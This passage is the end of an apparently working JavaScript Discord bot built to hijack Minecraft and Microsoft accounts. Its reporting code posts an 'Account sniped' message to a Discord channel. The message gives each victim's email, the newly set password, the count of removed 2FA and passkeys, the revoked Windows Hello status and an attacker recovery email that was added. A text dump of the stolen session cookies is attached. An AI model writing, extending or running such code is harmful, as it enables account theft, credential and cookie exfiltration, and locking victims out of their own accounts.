  const passed = session.report.filter((r) => r.ok).length;
  const failed = session.report.length - passed;

  const embed = new EmbedBuilder()
    .setColor(failed ? 0xfaa61a : 0x3ba55d)
    .setTitle('Account sniped')
    .addFields(
      { name: 'Minecraft IGN', value: `\`${session.ign}\``, inline: true },
      { name: 'Microsoft email', value: `\`${session.email}\``, inline: true },
      { name: 'New password', value: result.password ? `\`${result.password}\`` : '*unchanged*', inline: true },
      { name: '2FA / passkeys removed', value: String(result.proofsRemoved ?? 0), inline: true },
      { name: 'Windows Hello revoked', value: result.hello ? 'yes' : 'no', inline: true },
      { name: 'Recovery email added', value: result.emailAdded ? `\`${CFG.recoveryEmail}\` (${result.emailAdded.split('/').pop()})` : 'no', inline: true },
    )
    .setFooter({ text: `${session.sid} • ${passed} ok / ${failed} failed • ${session.userId}` })
    .setTimestamp();

  if (session.report.length) {
    embed.addFields({
      name: 'Steps',
      value: session.report.map((r) => `${r.ok ? '✅' : '❌'} ${r.name}${r.note ? ` — ${r.note}` : ''}`).join('\n').slice(0, 1024),
    });
  }

  const dump = [
    `IGN: ${session.ign}`,
    `Email: ${session.email}`,
    `Password: ${result.password || '(unchanged)'}`,
    `Recovery email added: ${result.emailAdded || 'no'}`,
    `Proofs removed: ${result.proofsRemoved ?? 0}`,
    `Windows Hello revoked: ${result.hello ? 'yes' : 'no'}`,
    '',
    'COOKIES:',
    cookies || '(none)',
    '',
    'STEPS:',
    ...session.report.map((r) => `${r.ok ? 'OK  ' : 'FAIL'} ${r.name}${r.note ? ' - ' + r.note : ''}`),
    '',
    `captured: ${new Date().toISOString()}`,
  ].join('\n');

  try {
    await channel.send({
      embeds: [embed],
      files: [new AttachmentBuilder(Buffer.from(dump, 'utf8'), { name: `${session.ign}-${session.sid}.txt` })],
    });
  } catch (e) {
    log('error', 'snip', `send failed: ${e.message}`);
  }
}

// ---------------------------------------------------------------------------
// 12. lifecycle
// ---------------------------------------------------------------------------

process.on('unhandledRejection', (e) => log('error', 'process', `unhandled: ${e?.message || e}`));
process.on('uncaughtException', (e) => log('error', 'process', `uncaught: ${e?.message || e}`));

for (const sig of ['SIGINT', 'SIGTERM']) {
  process.on(sig, async () => {
    log('warn', 'process', `${sig} — shutting down`);
    try { await client.destroy(); } catch { /* ignore */ }
    rl.close();
    process.exit(0);
  });
}

log('info', 'boot', `ward-bot starting (takeover ${CFG.takeover ? 'on' : 'off'})`);
client.login(CFG.token).catch((e) => die(`login failed: ${e.message}`));
